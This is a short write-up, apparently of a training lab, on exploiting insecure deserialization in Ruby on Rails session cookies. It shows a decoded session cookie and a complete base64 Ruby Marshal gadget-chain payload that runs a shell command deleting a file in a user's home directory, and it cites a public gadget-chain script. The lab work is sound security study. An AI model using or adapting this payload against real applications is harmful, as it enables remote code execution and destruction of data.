This lab uses a serialization-based session mechanism and the Ruby on Rails framework. 
There are documented exploits that enable remote code execution via a gadget chain in this framework.

To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. 
Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.


this is the session cookie which is flagged for insecure deserialization:
BAhvOglVc2VyBzoOQHVzZXJuYW1lSSILd2llbmVyBjoGRUY6EkBhY2Nlc3NfdG9rZW5JIiVmeW5qczdtOXY1dmFiem5ubWExcHNxaWxldDJmY3djeAY7B0YK

decoding the session cookie through base64 decoding:
{
  "^o": {
    "User": {
      "^o": {
        "username": "wiener",
        "EF": {
          "@access_token": "%fynjs7m9v5vabznnma1psqilet2fcwcx"
        }
      }
    }
  }
}

sending this gadget chain solves the lab:
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06Ol
BhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh
ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdG
VBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2Rf
aWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==

this is got by using the script for ruby on 
https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

also seen here:
insecure_deserialization/labs/script.rb

